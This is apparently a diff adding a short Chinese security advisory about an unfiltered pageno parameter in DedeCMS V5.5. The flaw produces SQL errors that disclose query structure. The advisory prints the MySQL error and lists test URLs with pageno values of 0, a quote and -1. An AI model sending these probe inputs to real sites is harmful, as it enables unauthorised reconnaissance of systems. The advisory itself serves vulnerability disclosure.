@@ -1,0 +1,18 @@
+漏洞版本:
+
+dedecms V5.5
+漏洞描述:
+
+系统用intval对$pageno的值进行了处理，但是intval处理过程中，如果为非正整数时，会赋值为0，系统就会出错。
+$pageno = isset($pageno) && is_numeric($pageno) ? max(1,$pageno) : 1;  
+没有对0进行过滤处理。
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-15,15' at line 7 - Execute Query False! Select arc.*, tp.typedir,tp.typename,tp.isdefault,tp.defaultname,tp.namerule,tp.namerule2,tp.ispart,tp.moresite,tp.siteurl from `dede_archives` arc left join `dede_arctype` tp on arc.typeid=tp.ID where arc.arcrank > -1 And (arc.typeid='10' Or arc.typeid2='10') order by arc.sortrank desc limit -15,15  
+ <* 参考
+amxku@sebug.net
+ http://luoq.net/dede-pageno/
+ *>
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.http://www.dedecms.com/plus/list.php?tid=10&pageno=02.http://www.dedecms.com/plus/list.php?tid=10&pageno='3.http://www.dedecms.com/plus/list.php?tid=10&pageno=-1
